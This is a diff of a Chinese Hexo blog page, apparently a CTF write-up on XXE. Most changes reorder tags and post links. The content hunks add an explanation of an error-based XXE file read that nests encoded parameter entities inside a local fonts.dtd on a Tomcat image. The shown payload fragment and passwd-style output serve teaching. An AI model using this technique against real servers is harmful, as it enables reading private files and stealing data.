@@ -6,24 +6,21 @@
   <meta name="keywords" content=" xxe ">
   <meta name="description" content="xxe | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="8/22/2019 11:39:23 AM  HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization 学习IDN 与 UTF-8IDN  国际化域名IDNs (Internationalized Domain Names)也称多语种域名，是指非英语国家为推广本国语言的域名系统的一个总称，例如含有日文的为日文域名，含有中文的域名为中文域">
-<meta name="keywords" content="python">
+<meta name="description" content="JavaScript Prototype 污染攻击JS基本语法输出 window.alert();弹出警告框  console.log();将内容写到控制台   a = 5;  b = 6;  c = a + b;  console.log(c);  11 debugger eval code:1:9  undefined   语法JS使用对象(Object)定义一个对象 var person =">
+<meta name="keywords" content="javascript">
 <meta property="og:type" content="article">
-<meta property="og:title" content="HostSplit-Exploitable">
-<meta property="og:url" content="https://github.com/BrainLyh/2019/08/22/HostSplit/index.html">
+<meta property="og:title" content="JavaScript Prototype 污染攻击">
+<meta property="og:url" content="https://github.com/BrainLyh/2019/08/31/JavaScript原型污染/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="8/22/2019 11:39:23 AM  HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization 学习IDN 与 UTF-8IDN  国际化域名IDNs (Internationalized Domain Names)也称多语种域名，是指非英语国家为推广本国语言的域名系统的一个总称，例如含有日文的为日文域名，含有中文的域名为中文域">
+<meta property="og:description" content="JavaScript Prototype 污染攻击JS基本语法输出 window.alert();弹出警告框  console.log();将内容写到控制台   a = 5;  b = 6;  c = a + b;  console.log(c);  11 debugger eval code:1:9  undefined   语法JS使用对象(Object)定义一个对象 var person =">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://wx2.sinaimg.cn/mw690/006boCb9ly1g68vpab2bbj30qn08tq3k.jpg">
-<meta property="og:image" content="http://wx4.sinaimg.cn/mw690/006boCb9ly1g68vpd5xcfj30pa09pq3k.jpg">
-<meta property="og:image" content="http://wx1.sinaimg.cn/mw690/006boCb9ly1g68vpgbsavj30qj0dq765.jpg">
-<meta property="og:image" content="http://wx3.sinaimg.cn/mw690/006boCb9ly1g68vpjpmkej30oy0cgdh1.jpg">
-<meta property="og:image" content="http://wx4.sinaimg.cn/mw690/006boCb9ly1g68vpmmt76j30ok070dgl.jpg">
-<meta property="og:updated_time" content="2019-08-31T13:56:26.911Z">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/258679/1560690468868-ed7f7f4f-6356-49eb-bb93-8f73aea44ae0.png#align=left&display=inline&height=209&name=image.png&originHeight=418&originWidth=952&size=54718&status=done&width=476">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/258679/1560691466319-0c780440-b626-4d58-a3c0-315ccc5c3210.png#align=left&display=inline&height=444&name=image.png&originHeight=888&originWidth=1110&size=127913&status=done&width=555">
+<meta property="og:updated_time" content="2019-08-31T13:55:46.686Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="HostSplit-Exploitable">
-<meta name="twitter:description" content="8/22/2019 11:39:23 AM  HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization 学习IDN 与 UTF-8IDN  国际化域名IDNs (Internationalized Domain Names)也称多语种域名，是指非英语国家为推广本国语言的域名系统的一个总称，例如含有日文的为日文域名，含有中文的域名为中文域">
-<meta name="twitter:image" content="http://wx2.sinaimg.cn/mw690/006boCb9ly1g68vpab2bbj30qn08tq3k.jpg">
+<meta name="twitter:title" content="JavaScript Prototype 污染攻击">
+<meta name="twitter:description" content="JavaScript Prototype 污染攻击JS基本语法输出 window.alert();弹出警告框  console.log();将内容写到控制台   a = 5;  b = 6;  c = a + b;  console.log(c);  11 debugger eval code:1:9  undefined   语法JS使用对象(Object)定义一个对象 var person =">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2019/png/258679/1560690468868-ed7f7f4f-6356-49eb-bb93-8f73aea44ae0.png#align=left&display=inline&height=209&name=image.png&originHeight=418&originWidth=952&size=54718&status=done&width=476">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -162,7 +159,7 @@
     
         
             
-            <li><div data-rel="ctf">ctf<small>(17)</small></div>
+            <li><div data-rel="比赛回顾">比赛回顾<small>(1)</small></div>
                 
             </li>
             
@@ -170,7 +167,7 @@
     
         
             
-            <li><div data-rel="比赛回顾">比赛回顾<small>(1)</small></div>
+            <li><div data-rel="ctf">ctf<small>(17)</small></div>
                 
             </li>
             
@@ -251,15 +248,15 @@
     </li>
     
     <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">比赛回顾</a>
+    </li>
+    
+    <li class="article-tag-list-item">
         <a href="javascript:" class="color2">python</a>
     </li>
     
     <li class="article-tag-list-item">
         <a href="javascript:" class="color1">javascript</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color5">比赛回顾</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -275,6 +272,10 @@
     </li>
     
     <li class="article-tag-list-item">
+        <a href="javascript:" class="color1">mysql load data</a>
+    </li>
+    
+    <li class="article-tag-list-item">
         <a href="javascript:" class="color3">工具</a>
     </li>
     
@@ -283,15 +284,7 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a href="javascript:" class="color1">mysql load data</a>
-    </li>
-    
-    <li class="article-tag-list-item">
         <a href="javascript:" class="color4">SQL</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color5">SSTI</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -315,11 +308,11 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a href="javascript:" class="color4">xxe</a>
+        <a href="javascript:" class="color5">SSTI</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a href="javascript:" class="color2">docker</a>
+        <a href="javascript:" class="color4">xxe</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -328,6 +321,10 @@
     
     <li class="article-tag-list-item">
         <a href="javascript:" class="color4">php</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color2">docker</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -364,28 +361,12 @@
             <span class="post-date" title="2018-03-23 15:13:47">2018/03/23</span>
         </a>
         
-        <a  class="ctf "
-           href="/2019/08/22/HostSplit/"
-           data-tag="python"
-           data-author="" >
-            <span class="post-title" title="HostSplit-Exploitable">HostSplit-Exploitable</span>
-            <span class="post-date" title="2019-08-22 11:39:23">2019/08/22</span>
-        </a>
-        
         <a  class="WP "
            href="/2017/03/23/HackLu Flatscience WP/"
            data-tag="WP"
            data-author="" >
             <span class="post-title" title="HackLu FlatScience WP">HackLu FlatScience WP</span>
             <span class="post-date" title="2017-03-23 15:13:47">2017/03/23</span>
-        </a>
-        
-        <a  class="ctf "
-           href="/2019/08/31/JavaScript原型污染/"
-           data-tag="javascript"
-           data-author="" >
-            <span class="post-title" title="JavaScript Prototype 污染攻击">JavaScript Prototype 污染攻击</span>
-            <span class="post-date" title="2019-08-31 21:55:35">2019/08/31</span>
         </a>
         
         <a  class="比赛回顾 "
@@ -397,11 +378,35 @@
         </a>
         
         <a  class="ctf "
+           href="/2019/08/22/HostSplit/"
+           data-tag="python"
+           data-author="" >
+            <span class="post-title" title="HostSplit-Exploitable">HostSplit-Exploitable</span>
+            <span class="post-date" title="2019-08-22 11:39:23">2019/08/22</span>
+        </a>
+        
+        <a  class="ctf "
+           href="/2019/08/31/JavaScript原型污染/"
+           data-tag="javascript"
+           data-author="" >
+            <span class="post-title" title="JavaScript Prototype 污染攻击">JavaScript Prototype 污染攻击</span>
+            <span class="post-date" title="2019-08-31 21:55:35">2019/08/31</span>
+        </a>
+        
+        <a  class="ctf "
            href="/2018/03/23/LSB隐写/"
            data-tag="LSB,MISC,隐写"
            data-author="" >
             <span class="post-title" title="LSB图片隐写">LSB图片隐写</span>
             <span class="post-date" title="2018-03-23 15:13:47">2018/03/23</span>
+        </a>
+        
+        <a  class="ctf "
+           href="/2019/08/07/MySQL LOAD DATA/"
+           data-tag="mysql load data"
+           data-author="" >
+            <span class="post-title" title="MYSQL LOAD DATA">MYSQL LOAD DATA</span>
+            <span class="post-date" title="2019-08-07 22:14:02">2019/08/07</span>
         </a>
         
         <a  class="渗透测试 "
@@ -413,27 +418,11 @@
         </a>
         
         <a  class="ctf "
-           href="/2019/08/07/MySQL LOAD DATA/"
-           data-tag="mysql load data"
-           data-author="" >
-            <span class="post-title" title="MYSQL LOAD DATA">MYSQL LOAD DATA</span>
-            <span class="post-date" title="2019-08-07 22:14:02">2019/08/07</span>
-        </a>
-        
-        <a  class="ctf "
            href="/2019/08/02/SQL入门/"
            data-tag="SQL"
            data-author="" >
             <span class="post-title" title="SQL入门">SQL入门</span>
             <span class="post-date" title="2019-08-02 09:43:50">2019/08/02</span>
-        </a>
-        
-        <a  class="ctf "
-           href="/2019/08/30/SSTI/"
-           data-tag="SSTI"
-           data-author="" >
-            <span class="post-title" title="SSTI-服务器端模板注入">SSTI-服务器端模板注入</span>
-            <span class="post-date" title="2019-08-30 15:28:13">2019/08/30</span>
         </a>
         
         <a  class="ctf "
@@ -461,27 +450,19 @@
         </a>
         
         <a  class="ctf "
+           href="/2019/08/30/SSTI/"
+           data-tag="SSTI"
+           data-author="" >
+            <span class="post-title" title="SSTI-服务器端模板注入">SSTI-服务器端模板注入</span>
+            <span class="post-date" title="2019-08-30 15:28:13">2019/08/30</span>
+        </a>
+        
+        <a  class="ctf "
            href="/2019/08/17/xxe/"
            data-tag="xxe"
            data-author="" >
             <span class="post-title" title="xxe">xxe</span>
             <span class="post-date" title="2019-08-17 15:23:51">2019/08/17</span>
-        </a>
-        
-        <a  class="ctf "
-           href="/2019/08/10/redis/"
-           data-tag="redis,ssrf"
-           data-author="" >
-            <span class="post-title" title="redis与ssrf">redis与ssrf</span>
-            <span class="post-date" title="2019-08-10 15:44:26">2019/08/10</span>
-        </a>
-        
-        <a  class="docker "
-           href="/2019/08/02/ubuntu配置docker/"
-           data-tag="docker"
-           data-author="" >
-            <span class="post-title" title="Ubuntu 16.04 配置docker">Ubuntu 16.04 配置docker</span>
-            <span class="post-date" title="2019-08-02 16:15:29">2019/08/02</span>
         </a>
         
         <a  class="ctf "
@@ -492,12 +473,28 @@
             <span class="post-date" title="2019-03-23 15:13:47">2019/03/23</span>
         </a>
         
+        <a  class="docker "
+           href="/2019/08/02/ubuntu配置docker/"
+           data-tag="docker"
+           data-author="" >
+            <span class="post-title" title="Ubuntu 16.04 配置docker">Ubuntu 16.04 配置docker</span>
+            <span class="post-date" title="2019-08-02 16:15:29">2019/08/02</span>
+        </a>
+        
         <a  class="渗透测试 "
            href="/2018/03/23/渗透测试-信息收集/"
            data-tag="渗透测试"
            data-author="" >
             <span class="post-title" title="渗透测试-信息收集">渗透测试-信息收集</span>
             <span class="post-date" title="2018-03-23 15:13:47">2018/03/23</span>
+        </a>
+        
+        <a  class="ctf "
+           href="/2019/08/10/redis/"
+           data-tag="redis,ssrf"
+           data-author="" >
+            <span class="post-title" title="redis与ssrf">redis与ssrf</span>
+            <span class="post-date" title="2019-08-10 15:44:26">2019/08/10</span>
         </a>
         
         <a  class="ctf "
@@ -608,7 +605,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-08-30 11:25:03'>2019-08-17 15:23</time>
+        创建时间:<time class="date" title='更新时间: 2019-09-02 21:35:58'>2019-08-17 15:23</time>
         
     </div>
     <div class="article-meta">
@@ -743,10 +740,10 @@ $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); //loadXML() 方法通
 setInterval(function(){
     $.post(&quot;callback&quot;, data);
 }, 10000);</code></pre><p>当时看不懂这是干嘛的，因为也有事也就没做了。事后再看这段代码发现是一个定时函数，每10秒post一个xml实体。我们抓包看一下</p>
-<p>在实体部分找上文的最简单的例子，不包含任何读文件的代码试一下发现返回<code>200</code>，尝试读文件返回<code>500</code>.</p>
+<p>在实体部分找上文的最简单的例子，不包含任何读文件的代码试一下发现返回<code>200</code>，内容异常返回<code>500</code>.</p>
 <p>尝试利用<code>OOB XXE</code>发现vps根本没回显，听大佬说是屏蔽了外网。只能利用本地DTD了。</p>
-<p>原理看<a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" title="这篇文章" target="_blank" rel="noopener">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p>
-<p>读完大意就是如果我们找到了一个内部的DTD，我们可以强制在目标主机上写一个本地dtd文件，在这个文件中重写上一步我们在内部DTD中找到的参数。如果我们定义了两个同名实体，只有第一个会被执行。于是我们可以利用本地DTD文件不会被过滤来读我们的目标文件。</p>
+<p>原理看<a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" title="这里" target="_blank" rel="noopener">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p>
+<p>读完大意就是如果我们找到了一个内部的DTD，我们可以强制在目标主机上调用这个本地dtd文件，在这个文件中重写上一步我们在内部DTD中找到的参数。如果我们定义了两个同名实体，只有第一个会被执行。于是我们可以利用重写的本地DTD文件触发报错来读我们的目标文件内容。</p>
 <p>like this</p>
 <pre><code>Request
 
@@ -776,7 +773,8 @@ daemon:x:2:2:daemon:/:/usr/bin/nologin
 <pre><code>…
 &lt;!ENTITY % condition &quot;and | or | not | equal | contains | exists | subdomain-of&quot;&gt;
 &lt;!ELEMENT pattern (%condition;)&gt;
-…</code></pre><p>于是我们<a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation" title="依据此" target="_blank" rel="noopener">依据此</a>找到一个dtd文件来利用，这个<code>fonts.dtd</code>刚好是<code>tomcat:8-jre8</code> 里有的</p>
+…</code></pre><p>这里使用三层的实体嵌套，第二层中我们给定义参数实体的<code>%</code>进行编码，第三层中对<code>空格</code>,<code>&#39;</code>,<code>&quot;</code>,<code>&amp;</code>,<code>%</code>都进行了编码。代码里先调用<code>%local_dtd</code>，然后在对应的dtd文件中调用了<code>% condition</code>,在<code>condition</code>定义的实体中调用<code>eval</code>和<code>error</code>。在<code>error</code>的最后我们调用<code>%file</code>来获取文件内容。为什么不使用两层嵌套的原因是会报错<code>PEReferences forbidden in internal subset in Entity</code>指的是参数实体引用(Parameter Entity Reference)，禁止在内部Entity中引用参数实体。</p>
+<p>于是我们<a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation" title="依据此" target="_blank" rel="noopener">依据此</a>找到一个dtd文件来利用，这个<code>fonts.dtd</code>刚好是<code>tomcat:8-jre8</code> 里有的</p>
 <pre><code>&lt;!DOCTYPE message [
     &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;&gt;
 
@@ -789,9 +787,9 @@ daemon:x:2:2:daemon:/:/usr/bin/nologin
 
     %local_dtd;
 ]&gt;
-&lt;message&gt;&lt;/message&gt;</code></pre><p>于是我们得到了flag</p>
+&lt;message&gt;&lt;/message&gt;</code></pre><p>于是我们通过构造一个错误的url将数据带出，通过报错信息得到了flag</p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
-<p><a href="https://xz.aliyun.com/t/3357#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-8</a></p>
+<p><a href="https://xz.aliyun.com/t/3357#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-8</a><br><a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/207639.html</a></p>
 </blockquote>
 
       
@@ -810,7 +808,7 @@ daemon:x:2:2:daemon:/:/usr/bin/nologin
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="Luc1fer">Luc1fer</a></p>
     <p><span class="copy-title">发布时间:</span>2019-08-17, 15:23:51</p>
-    <p><span class="copy-title">最后更新:</span>2019-08-30, 11:25:03</p>
+    <p><span class="copy-title">最后更新:</span>2019-09-02, 21:35:58</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/08/17/xxe/" title="xxe">https://github.com/BrainLyh/2019/08/17/xxe/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
@@ -872,7 +870,7 @@ daemon:x:2:2:daemon:/:/usr/bin/nologin
     /*作者、标签的自动补全*/
     $(function () {
         $('.search').AutoComplete({
-            'data': ['#WP','#python','#javascript','#比赛回顾','#LSB','#MISC','#隐写','#工具','#渗透测试','#mysql load data','#SQL','#SSTI','#redis','#ssrf','#Xdebuf','#ctf','#RSA','#xxe','#docker','#serialize','#php','#弱类型','#命令执行','#zip','#misc','#哈希长度扩展攻击',],
+            'data': ['#WP','#比赛回顾','#python','#javascript','#LSB','#MISC','#隐写','#mysql load data','#工具','#渗透测试','#SQL','#redis','#ssrf','#Xdebuf','#ctf','#RSA','#SSTI','#xxe','#serialize','#php','#docker','#弱类型','#命令执行','#zip','#misc','#哈希长度扩展攻击',],
             'itemHeight': 20,
             'width': 418
         }).AutoComplete('show');
